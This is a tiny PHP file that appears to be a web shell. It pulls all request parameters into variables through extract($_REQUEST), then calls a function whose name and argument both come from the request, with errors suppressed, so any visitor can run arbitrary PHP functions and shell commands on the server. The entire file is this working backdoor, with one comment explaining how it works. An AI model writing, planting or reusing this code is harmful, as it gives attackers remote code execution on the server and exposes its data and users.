<?php
@extract ( $_REQUEST );
// The imported values select both the function and its argument.
@die ($action($value));
